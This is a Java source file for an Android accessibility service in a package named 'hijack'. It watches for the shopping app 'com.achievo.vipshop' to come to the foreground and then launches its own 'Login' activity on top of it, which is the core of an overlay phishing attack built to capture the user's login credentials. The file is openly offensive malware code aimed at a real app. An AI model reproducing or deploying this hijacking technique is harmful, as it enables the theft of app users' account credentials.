package com.haoren.hijack;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

public class MyAccessibilityService extends AccessibilityService{

	@Override
	public void onAccessibilityEvent(AccessibilityEvent arg0) {
		String topActivity = null;
		String s = "";
		if(arg0 != null){
			if(arg0.getPackageName() != null){
				topActivity = arg0.getPackageName().toString();
			}
			if(arg0.getText() != null){
				s = arg0.getText().toString().split(",")[0].replace("[", "").replace("]", "");
			}
		}
		//if(topActivity.equals("com.achievo.vipshop") && s.equals("µÇ Â¼")){
		if(topActivity.equals("com.achievo.vipshop")){
			Log.i("accessibility", "xxxx"+s);
			Intent i = new Intent();
			i.setClassName("com.haoren.hijack", "com.haoren.hijack.Login");
			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			getApplicationContext().startActivity(i);
		}
	}

	@Override
	public void onInterrupt() {
		
	}

}
